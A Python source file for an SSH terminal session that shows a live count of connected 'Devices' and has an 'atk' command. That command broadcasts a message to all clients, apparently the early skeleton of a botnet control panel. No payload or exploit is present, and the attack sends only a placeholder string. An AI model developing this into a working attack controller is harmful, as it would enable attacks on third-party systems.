import time
import threading
import broadcast

UP_KEY = '\x1b[A'.encode()
DOWN_KEY = '\x1b[B'.encode()
RIGHT_KEY = '\x1b[C'.encode()
LEFT_KEY = '\x1b[D'.encode()
BACK_KEY = '\x7f'.encode()

def live_title(channel, username):
    while 1:
        try:
            channel.send(f'\33]0;[ {len(broadcast.addr_clients)} ] Devices | {username}\a')
            time.sleep(0.2)
        except:
            channel.close()

# https://securehoney.net/blog/how-to-build-an-ssh-honeypot-in-python-and-docker-part-1.html
def main_cmds(channel, username, addr):
    spining_thing = ['-', '\\', '|', '/']
    cscreen = "\033[2J\033[H" # clear screen
    channel.send(cscreen)

    for i in range(10):
        channel.send(f"\rLoading Terminal {spining_thing[i % len(spining_thing)]} ")
        time.sleep(0.3)
    channel.send(cscreen)
    
    run = True
    threading.Thread(target=live_title, args=(channel, username,)).start()
    while run:
        bashrc = f"\033[32;1m{username}@localhost# \033[0m"
        channel.send(bashrc)
        command = ""
        while not command.endswith("\r"):
            transport = channel.recv(1024).decode("utf-8")
            if transport == "\r":  # Carriage return
                channel.send("\r\n")
                break
            elif transport == "\x7f":  # Backspace
                if len(command) > 0:
                    command = command[:-1]  # Remove last character
                    channel.send("\b \b")  # Erase previous character on the terminal

            elif transport == "\x1b[A" or transport == "\x1b[B":
                pass
            # elif transport == "\x1b[D":
            #     if len(command) == 0:
            #         pass
            #     else:
            #         channel.send("\b")
            else:
                command += transport
                channel.send(transport)

        command = command.strip().lower()  
        if command == 'help':
            channel.send("Help commands\r\n")
        elif command == 'ip':
            channel.send(f'{addr[0]}\r\n')
        elif command == 'atk':
            channel.send("Message sent")
            broadcast.message("uwu")
        elif command == 'clear' or command == 'cls':
            channel.send(cscreen)
        elif command == 'exit':
            run = False
        else:
            channel.send("\r")
            

    print(f"[SSH] User {username} logged out {addr[0]}")
    channel.close()